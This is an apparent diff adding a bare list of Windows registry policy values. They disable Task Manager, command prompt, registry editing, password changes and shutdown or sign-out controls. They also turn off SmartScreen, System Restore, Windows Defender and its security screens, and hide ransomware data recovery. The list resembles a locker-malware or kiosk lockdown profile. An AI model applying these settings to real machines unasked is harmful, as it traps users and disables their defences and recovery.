@@ -1,0 +1,147 @@
+HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System:
+DisableChangePassword = 1
+DisableLockWorkstation = 1
+DisableRegistryTools = 1
+DisableTaskMgr = 1
+
+HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer:
+HidePowerOptions = 1
+NoControlPanel = 1
+NoRun = 1
+
+HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System:
+DisableCMD = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System:
+HideFastUserSwitching = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer:
+HidePowerOptions = 1
+NoControlPanel = 1
+NoRun = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Search\\AllowFindMyFiles: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowEditDeviceName: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowLanguage: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowPowerSleep: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowSignInOptions: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowYourAccount: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\EnableAppInstallControl: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\EnableSmartScreenInShell: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\PreventOverrideForFilesInShell: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\DisableContextMenus: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideAppList: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideChangeAccountSettings: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideFrequentlyUsedApps: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideHibernate: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideLock: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HidePeopleBar: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HidePowerButton: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRecentJumplists: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRecentlyAddedApps: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRestart: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideShutDown: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSignOut: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSleep: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSwitchAccount: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideUserTile: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\NoPinningToTaskbar: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDeviceDelete: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDiagnosticDataViewer: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDirectXDatabaseUpdate: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableEnterpriseAuthProxy: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableSystemRestore: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\TaskManager\\AllowEndTask: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableAccountProtectionUI: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableDeviceSecurityUI: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableNetworkUI: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableVirusUI: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisallowExploitProtectionOverride: x
+value = 0
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\HideRansomwareDataRecovery: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\HideSecureBoot: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsLogon\\DontDisplayNetworkSelectionUI: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsLogon\\HideFastUserSwitching: x
+value = 1
+
+HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender: x
+DisableAntiSpyware = 1
